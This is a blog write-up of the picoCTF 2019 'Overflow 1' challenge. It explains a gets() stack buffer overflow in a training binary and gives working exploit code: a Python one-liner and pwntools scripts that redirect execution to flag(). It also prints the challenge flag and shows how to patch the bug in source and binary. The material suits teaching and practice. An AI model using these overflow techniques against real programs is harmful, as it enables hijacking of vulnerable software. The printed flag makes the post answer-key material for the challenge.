---
layout: post
title: "picoCTF 2019 - Overflow 1 - 'A PWNy For Your Thoughts'"
date: 2019-10-15 13:37:11
excerpt_separator: <!--more-->
disqus: true
author: clay
categories:
  - ctf
  - pwn
  - pico
image: assets/images/pico2019/family_guy_pony_ride.jpg

---

I have never really been that great at binary exploitation challenges. But I am fascinated with return oriented programming attacks and the concept of [weird machines](https://www.cs.dartmouth.edu/~sergey/wm/). To this end, I am intentionally working on getting better and wanted to blog about some of my recent work with pwn challenges and some cool tools and tricks I have learned. This is very much an introductory coverage of binary exploitation, but maybe even those more experienced will see something new here. This will _hopefully_ be the first of many posts on pwn and lead to some *rop* challenges.

<!--more-->

I love to CTF. I have not had a chance to do it much over the past year, much less do any write ups. But with the [Presidents Cup Cybersecurity](https://presidentscup.us) competition this fall, I started getting back in to it. More on that in the future. So to get my CTF-game back on, I put lots of effort into one of my favorite CTFs of the year, [picoCTF](http://www.picoctf.com). So I will start with a few intro pwn challenges from this year's pico. 

Some of this may seem overkill for such an easy problem, but it's cool to try and break it as thoroughly as possible. Plus, it's good practice and some people might be trying to learn out there/.

### Overflow-1

**Problem:**

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this _program_? You can find it in `/problems/overflow-1_...` on the shell server. _Source_

We are provided with links to a binary executable [vuln](../assets/images/pico2019/oveflow1/vuln) and the source [vuln.c](../assets/images/pico2019/overflow1/vuln.c). The source can be seen below.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```
**Recon:**

On the shell server in the `/problems` directory, we find the following files.

```bash
$ ls -l
total 16
-r--r----- 1 hacksports overflow-1_4   42 Sep 28 21:51 flag.txt
-rwxr-sr-x 1 hacksports overflow-1_4 7532 Sep 28 21:51 vuln
-rw-rw-r-- 1 hacksports hacksports    742 Sep 28 21:51 vuln.c
```

We have the two files that are linked from the problem description (`vuln` and `vuln.c`) and a `flag.txt` file. Only the owner (hacksports) can read the flag file. Our ctf-participant user can read the source code and read and execute the binary. A special note of the binary is that the `setgid` bit is enabled. This means that when any user executes the binary, the program operates with the permissions of the owning group (`overflow-1`). So even though we cannot read the flag file, when we run the `vuln` binary, it can read the flag file for us. This will be important as we investigate the binary.

Checking out the binary with the `file` command we see the following:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
```

So we know it's a dynamically linked 32-bit binary. We can look at some more stuff, but since we have source code, we don't too much more information. But lets just go through the steps.

Checking out the shared object dependencies, we can see  the libc information.

```bash
$ ldd vuln
	linux-gate.so.1 (0xf7f73000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d88000)
	/lib/ld-linux.so.2 (0xf7f75000)
```

One last thing, even though we have the shell code, let's check for any interesting strings in the binary.

```
/lib/ld-linux.so.2
yX8/
libc.so.6
_IO_stdin_used
exit
fopen
puts
printf
fgets
stdout
setresgid
getegid
setvbuf
__libc_start_main
GLIBC_2.1
GLIBC_2.0
__gmon_start__
UWVS
[^_]
flag.txt
Flag File is Missing. please contact an Admin if you are running this on the shell server.
Woah, were jumping to 0x%x !
Give me a string and lets see what happens:
;*2$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
.....
```

Only showing the first few lines, we can see the binary was compiled on an Ubuntu 18.04 machine. This could be helpful if we wanted to replicate this setup to build an exploit. _Spoiler: we won't_. Also we can see some of the functions that the binary uses and the reference to the `flag.txt` file. Which when paired up with the call to `fopen()` is promising.

Let's check out what kind of protections are on the file with `checksec` which was installed on the picoCTF shell server.

```bash
checksec vuln
[*] './overflow-1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We can see not many protections are on this file. The stack is executable, there is no stack canary, and it is not a position independent executable. But we do have partial relocation read-only protections available. 

**Program Flow:**

As we can see from the source code, the main function of our program is going to prompt the user for some input and then call the `vuln` function. This function will read the user input from standard input. Then print a message about where the return address is using a (presumably internal picoCTF function from _asm.h_) called `get_return_address()`.

```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

Though its not called, there is an _interesting_ function called *flag()*. This function opens up that local file called `flag.txt` and reads its contents into a local variable and then prints that buffer to standard output.

```c
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```
If we did not have the source code, we would want to use some other tools to check out the binary for execution flow. Let's look at this binary with a few different tools. 

_Binary Ninja_

![](../assets/images/pico2019/overflow1/binja-main.png)

Looking at the _main_ function in Binary Ninja, we see the preamble setting up our stack frame, setting the buffering on standard out, and the setting up of the real group ids for the binary. Then we see the call to `puts()` with the prompt and the call to `vuln()`

![](../assets/images/pico2019/overflow1/binja-vuln.png)

Looking at the _vuln_ function, we see a call to `gets()` , the call to the `get_return_address` function, then a `printf()` call about jumping back to the return address.

![](../assets/images/pico2019/overflow1/binja-flag.png)

Finally, in our uncalled _flag_ function we see a call to `fopen()` on the flag file then a branch based on the result. If the flag file is not there or cannot be opened, an error is printed and the program exits. If the flag file is opened, we see a call to `fgets()` and then `printf()`

**Vulnerability:**

So, I am sure you are saying... "come on, Clay!" get to the good part, we know all that about the binary. But hopefully if you are reading this you are getting a better understanding of why these exploits work, and how to do this without source code.

When looking at all those function calls, there should be a red flag (no pun intended) caught your eye. It's the use of the `gets()` function call. When looking at the man page for gets, you will see the following verbiage used:

```
NAME
       gets - get a string from standard input (DEPRECATED)
```

```
gets()  reads  a  line  from  stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
```
```
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because  gets()  will  continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently Dangerous Function") at http://cwe.mitre.org/data/definitions/242.html
```

If that was not enough warning for you, just try and compile the source code on the shell server (in your home directory where you have write permissions) 

```
vuln.c:(.text+0xac): warning: the "gets" function is dangerous and should not be used.
```

As you can see from the messages, `gets()` only takes one argument and that is a character pointer where the data read from standard input should be stored in memory. It will read until a newline or an end of file character is encountered. Thus if you give it 1337 characters before a newline, it will read them all. It does not care how much memory you have allocated for the data. It will just overwrite everything it can.

Looking again at the source code for `vuln`, we see the argument to gets is the address of the `buf` which is a 64 byte character array that is on the stack. 

The debuging the binary in GDB with _peda_ enhancement shows us that the instruction at address `0x08048678` is a call to `gets()` and the argument which is stored on the stack is the address of the memory location 0x48 bytes below our saved base pointer register. Thus after we send 72 bytes, we are first overwriting the saved based pointer with the next four bytes. The four bytes after that are overwriting our saved return instruction pointer. Or the address of the next instruction we will call when we exit the `vuln` function.

![](../assets/images/pico2019/overflow1/peda-vuln-gets.png)

**Exploit**

So now lets see what we can do with the binary when we give it too much data. Before getting the flag, lets just run the program with a well-behaved input (less than 64 bytes allocated for our array).

```bash
$ ./vuln
Give me a string and lets see what happens:
Hes no good to me dead
Woah, were jumping to 0x8048705 !
```

So, if we give it normal input, we will exit `vuln` and jump to the address `0x08048705`. Which when we look at the binary, is the instruction in `main()` right after our call to `vuln()`

```bash
$ objdump -D -Mintel vuln | grep 8048705 -B 1
 8048700:	e8 5a ff ff ff       	call   804865f <vuln>
 8048705:	b8 00 00 00 00       	mov    eax,0x0
``` 

Interestingly enough, the instruction to call our vulnerable function, is 5 bytes before the call to `vuln()` at `0x08048700`. So the first thing I am going to try is to loop back into _vuln_ for a second time. 

Remembering the blurb from the man page for `gets()`, it says the function will read all the characters until it encounters a newline or an end-of-file condition, and then that character will be replaced with a null byte. So if we send exactly 76 bytes then a newline (grand total of 77), we will overflow the buffer and overwrite the saved base pointer and our null byte will overwrite the LSB of the saved return pointer. Essentially replacing that `0x05` with our `0x00` and thus calling `vuln()` again.

![](../assets/images/pico2019/overflow1/peda-vuln-ebp-eip.png)

```bash
$ python -c "print 76 * 'A'" | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x8048700 !
Woah, were jumping to 0x8048705 !
Segmentation fault (core dumped)
```
As you can see, sending exactly 76 'A' characters overflowed and caused the newline from our python print statement to overwrite the LSB (remember little-endian) of the return address. So we called `vuln()` again. We could do this many times with some additional newlines, but I will leave that as an exercise to the reader.

That's all good and what not, but lets get that flag. So we obviously want to jump into the call to `flag()`. So we will need to get the address of that call. We can use many tools, but let's use `objdump` and `grep` like we did above.

```bash
$ objdump -D -Mintel vuln | grep flag
080485e6 <flag>:
 8048618:	75 1c                	jne    8048636 <flag+0x50>
```

Flag is located in our binary at `0x080485e6` We also can see that same address from Binary Ninja above. So our payload would be 72 characters to fill the buffer, 4 bytes to overwrite the saved EBP and then our address in bytes in little-endian order.

A quick python solve would look like this:

```bash
$ python -c "print 72 * 'A' + '_ebp' + '\xe6\x85\x04\x08'" | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
Segmentation fault (core dumped)
```

But we are not done just yet, lets write a pwntools script to interact with the binary and get the flag.

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'error'
p = process('./vuln',cwd='/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a')
flag = p32(0x080485e6)
payload = 72 * 'A' + '_ebp' + flag
p.sendlineafter(':',payload)
p.recvuntil('!\n')
print p.recv()
```

Running this give us the flag as expected.

```
$ ./exploit.py
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
```
That is not really taking advantage of the full power of `pwntools`... That would look something like this:

```python
#!/usr/bin/env python2
from pwn import *

context.log_level = 'critical'

path = '/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a/'
exe = context.binary = ELF(path + 'vuln')
p = process(['./vuln'],cwd=path)
payload = cyclic(1024)

p.sendline(payload)
p.wait()

core = Corefile('./core')
assert pack(core.eip) in payload

p = process(['./vuln'],cwd=path)
payload = fit({cyclic_find(core.eip):exe.symbols.flag})
p.sendline(payload)
p.recvuntil('!\n')
print p.recvall()
```

Here we don't even have to calculate the offset, as we can make the program crash, read _eip_ from the core dump, and use the fit function to build our payload. I will dive into those techniques in a future post. Also, by using the `ELF` object, we have access to the symbols, such as the function `flag()`. No need to calculate the function's address either.

```
$ ./exploit_blog.py
[!] Found bad environment at 0xffe69fc5
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
```

This is the result. I am not sure what the `[!]` error message is. I tried turning it off with the _log_level_ but that still did not work.

**Patching**

Most of the time with CTF problems, write-ups only cover the exploit and never the patch. But if someone wants to be a secure coder, then need to know how to rewrite faulty programs using the proper functions. Additionally, for attack and defend CTFs, you need to know how to patch.

Starting first with the source code, we can just change our `gets()` call and replace it with a `fgets()`. The function is more secure since it takes a length parameter. The man pages shows the following:

```
char *fgets(char *s, int size, FILE *stream);
```

```
fgets()  reads  in  at  most  one less than size characters from stream and stores them into the buffer pointed to by s.  Reading stops after an EOF or a newline.  If a newline is read, it is stored into the buffer.  A terminating null byte ('\0') is stored after the last character in the buffer.
```

So we will update `vuln()` as follows:

```c
void vuln(){
  char buf[BUFFSIZE];
  //gets(buf);
  fgets(buf,BUFFSIZE,stdin);

  printf("Woah, were jumping to 0x !\n"); //get_return_address());
}
```

You will notice, I cleaned up the `printf()` statement since we don't have a copy of `asm.h` so we cannot use the `get_return_address()` function call. Additionally you need to comment out the include statement for the asm header file.

Compiling and attempting to exploit this patched `vuln.c` shows it is not vulnerable to a buffer overflow.

```bash
$ gcc -o vuln_src_patched vuln.c
$ python -c "print 'A'*1024" | ./vuln_src_patched
Give me a string and lets see what happens:
Woah, were jumping to 0x !
$
```

But sometimes you don't have the source code and need to patch the binary. This is not the most elegant way, but since the call to `gets()` does not do anything for us, we can just replace all the bytes for that function call with _no operations_ or `\x90` opcodes (re: nops).

Disassembling the `vuln` binary again, we see this call on this line:

```
 8048678:	e8 b3 fd ff ff       	call   8048430 <gets@plt>
```
Since we know the binary gets loaded at address `0x0804800` we need to calculate how far into the binary are these 5 bytes, and then _nop_ them out. A python script below does just that.

```python
with open('vuln_original') as f:
    data = f.read()
call_puts = 0x8048678 - 0x8048000

newdata = data[:call_puts] + '\x90'*5 + data[call_puts+5:]

with open('vuln_bin_patch', 'w') as f:
     f.write(newdata)
```

We are left with a "neutered" binary that does nothing (still).

```bash
$ chmod u+x vuln_bin_patch
$ python -c "print 'A' * 1024" | ./vuln_bin_patch
Give me a string and lets see what happens:
Woah, were jumping to 0x8048705 !
```

**Conclusion**

Well there it is... the second buffer overflow challenge from picoCTF 2019. A detailed explaination of the binary, the vulnerability, the exploit, and the patch. In the future, I want to return to this binary and see if we can get a shell from shellcode on the stack or via ROP back to a call to `system` in libc. I will save that for a future writeup.
